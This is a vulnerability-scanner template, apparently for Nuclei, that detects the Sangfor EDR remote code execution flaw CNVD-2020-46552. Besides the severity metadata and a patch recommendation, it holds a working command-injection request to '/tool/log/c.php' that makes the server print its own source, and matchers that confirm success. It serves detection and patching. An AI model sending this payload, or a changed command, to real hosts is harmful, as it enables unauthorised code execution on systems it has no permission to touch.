id: CNVD-2020-46552
info:
  name: Sangfor EDR - Remote Code Execution
  author: ritikchaddha
  severity: critical
  description: A Sangfor Endpoint Monitoring and Response Platform (EDR) vulnerability
    allows attackers to remotely execute code and run arbitrary commands on the target
    host by constructing an HTTP request.
  reference:
  - https://www.modb.pro/db/144475
  - https://blog.csdn.net/bigblue00/article/details/108434009
  - https://cn-sec.com/archives/721509.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: cnvd,cnvd2020,sangfor,rce
  metadata:
    impact: The impact of the CNVD-2020-46552 Sangfor EDR remote code execution vulnerability
      is that an attacker could remotely execute arbitrary commands on the targeted
      host.
    recommendation: It is recommended to patch the Sangfor Endpoint Monitoring and
      Response Platform (EDR) as soon as possible to prevent exploitation from remote
      code execution vulnerability CNVD-2020-46552.
requests:
- method: GET
  path:
  - '{{BaseURL}}/tool/log/c.php?strip_slashes=printf&host=nl+c.php'
  matchers:
  - type: dsl
    dsl:
    - contains(body, "$show_input = function($info)")
    - contains(body, "$strip_slashes($host)")
    - contains(body, "Log Helper")
    - status_code == 200
    condition: and
